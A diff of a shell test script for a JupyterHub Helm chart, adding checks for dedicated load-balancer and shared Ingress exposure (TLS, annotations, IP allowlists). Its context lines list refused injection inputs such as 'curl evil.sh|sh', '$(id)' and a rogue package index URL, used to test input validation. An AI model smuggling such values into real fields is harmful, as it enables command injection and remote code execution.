@@ -7,7 +7,7 @@ fail() { echo "FAIL: $1"; exit 1; }
 tmp=$(mktemp); trap 'rm -f "$tmp"' EXIT
 host=nb1.ns.example.com; leaf=nb1-sgt-code1.ns.example.com
 cat > "$tmp" <<EOF
-public: { host: $host, leafHost: $leaf, tlsSecret: nb1-tls, certIssuer: dns01-letsencrypt-ns-example-com }
+public: { host: $host, leafHost: $leaf, tlsSecret: nb1-tls, certIssuer: dns01-letsencrypt-ns-example-com, exposure: dedicated }
 seagit: { deploymentId: dep123 }
 serviceAccount: { name: k8s-code1-nb1, roleArn: "arn:aws:iam::111122223333:role/sgt-app-code1-nb1" }
 jupyterhub:
@@ -15,10 +15,19 @@ jupyterhub:
     auth: { type: password, admins: alice, allowedUsers: "bob, carol", adminPassword: "$(printf 'A%.0s' {1..43})", userPassword: "$(printf 'B%.0s' {1..43})" }
     bucket: env-nb-abc123
     region: us-east-1
+  # the record's "Dedicated load balancer" block (exposure: dedicated), as before 0.1.6
   proxy:
-    https: { hosts: [$host], secret: { name: nb1-tls } }
+    https: { enabled: true, type: secret, hosts: [$host], secret: { name: nb1-tls } }
     service:
-      annotations: { external-dns.alpha.kubernetes.io/hostname: $leaf }
+      type: LoadBalancer
+      labels: { seagit.io/report-address: "true" }
+      annotations:
+        service.beta.kubernetes.io/aws-load-balancer-type: external
+        service.beta.kubernetes.io/aws-load-balancer-nlb-target-type: ip
+        service.beta.kubernetes.io/aws-load-balancer-scheme: internet-facing
+        service.beta.kubernetes.io/aws-load-balancer-attributes: load_balancing.cross_zone.enabled=true
+        external-dns.alpha.kubernetes.io/cloudflare-proxied: "false"
+        external-dns.alpha.kubernetes.io/hostname: $leaf
       loadBalancerSourceRanges: [203.0.113.7/32]
   singleuser: { serviceAccountName: k8s-code1-nb1 }
 EOF
@@ -242,4 +251,56 @@ refused --set-string 'jupyterhub.custom.serverPackages=s3fs;curl evil.sh|sh'
 refused --set-string 'jupyterhub.custom.serverPackages=$(id)'
 refused --set-string 'jupyterhub.custom.serverPackages=boto3>=1.0'
 refused --set-string 'jupyterhub.custom.serverPackages=--index-url=http://evil'
+
+# --- shared entrance (public.exposure=shared, the 0.1.6 default): an Ingress, no load balancer ---
+sh_tmp=$(mktemp)
+cat >"$sh_tmp" <<EOF
+public: { host: $host, leafHost: $leaf, tlsSecret: nb1-tls, certIssuer: dns01-letsencrypt-ns-example-com, allowedCidrs: "203.0.113.7/32, 198.51.100.0/24" }
+seagit: { deploymentId: dep123 }
+serviceAccount: { name: k8s-code1-nb1, roleArn: "arn:aws:iam::111122223333:role/sgt-app-code1-nb1" }
+jupyterhub:
+  custom:
+    auth: { type: password, admins: alice, adminPassword: "$(printf 'A%.0s' {1..43})", userPassword: "$(printf 'B%.0s' {1..43})" }
+    bucket: env-nb-abc123
+    region: us-east-1
+  singleuser: { serviceAccountName: k8s-code1-nb1 }
+EOF
+shr() { helm template nb1 "$chart" -n apps -f "$sh_tmp" "$@"; }
+shrefused() { if shr "$@" >/dev/null 2>&1; then fail "shared accepted: $*"; fi; }
+sh=$(shr)
+ssvc=$(out="$sh" doc Service nb1-notebooks-proxy-public)
+grep -q 'type: ClusterIP' <<<"$ssvc" || fail "shared: proxy-public is ClusterIP"
+grep -q 'report-address' <<<"$ssvc" && fail "shared: no load-balancer report label"
+grep -q -E 'LoadBalancer|aws-load-balancer' <<<"$sh" && fail "shared: nothing asks for a load balancer"
+grep -q 'name: https' <<<"$ssvc" && fail "shared: the proxy serves plain HTTP only"
+grep -q 'secretName: nb1-tls' <<<"$(out="$sh" doc Deployment nb1-notebooks-proxy)" && fail "shared: the proxy mounts no TLS secret"
+grep -q 'kind: CronJob' <<<"$sh" && fail "shared: no proxy restart for certificates"
+ing=$(out="$sh" doc Ingress nb1-notebooks)
+[ -n "$ing" ] || fail "shared: Ingress rendered"
+grep -q 'ingressClassName: nginx' <<<"$ing" || fail "shared: nginx class"
+for h in "$host" "$leaf"; do grep -q -- "- host: \"$h\"" <<<"$ing" || fail "shared: rule for $h"; done
+grep -A3 'tls:' <<<"$ing" | grep -q "$host" && grep -q 'secretName: nb1-tls' <<<"$ing" || fail "shared: TLS for both names"
+grep -q 'name: nb1-notebooks-proxy-public' <<<"$ing" && grep -q 'number: 80' <<<"$ing" || fail "shared: backend proxy-public:80 by number"
+grep -q -E "external-dns.alpha.kubernetes.io/hostname: \"?$leaf\"?$" <<<"$ing" || fail "shared: external-dns publishes the leaf"
+grep -q 'ingress-hostname-source: annotation-only' <<<"$ing" || fail "shared: external-dns annotation-only"
+grep -q 'proxy-read-timeout: "3600"' <<<"$ing" && grep -q 'proxy-send-timeout: "3600"' <<<"$ing" || fail "shared: websocket timeouts"
+grep -q 'proxy-body-size: "512m"' <<<"$ing" || fail "shared: upload size"
+grep -q 'whitelist-source-range: "203.0.113.7/32,198.51.100.0/24"' <<<"$ing" || fail "shared: Allowed IPs"
+grep -q 'kind: Certificate' <<<"$sh" || fail "shared: the chart's Certificate still issues"
+# anyone: no allowlist (also when 0.0.0.0/0 is one of several)
+grep -q whitelist-source-range <<<"$(shr --set public.allowedCidrs=)" && fail "shared: empty = no allowlist"
+grep -q whitelist-source-range <<<"$(shr --set-string 'public.allowedCidrs=0.0.0.0/0\,203.0.113.7/32')" && fail "shared: 0.0.0.0/0 = no allowlist"
+# only nginx annotations the Gateway route sync can map (gatewaymig mappedNginx), never a named port
+grep -o 'nginx.ingress.kubernetes.io/[a-z-]*' <<<"$ing" | sort -u | grep -v -E '/(whitelist-source-range|proxy-read-timeout|proxy-send-timeout|proxy-body-size)$' && fail "shared: annotation the Gateway sync cannot map"
+shrefused --set-string 'public.allowedCidrs=10.0.0.0/33'
+shrefused --set-string 'public.allowedCidrs=evil'
+shrefused --set jupyterhub.proxy.https.enabled=true
+shrefused --set jupyterhub.proxy.service.type=LoadBalancer
+shrefused --set public.exposure=public
+shrefused --set-string 'public.timeoutSeconds=1h'
+shrefused --set-string 'public.maxUploadSize=1 GB'
+shrefused --set-string 'public.ingressClassName=Bad Class'
+# dedicated renders no Ingress
+grep -q 'kind: Ingress' <<<"$out" && fail "dedicated: no Ingress"
+rm -f "$sh_tmp"
 echo "PASS"
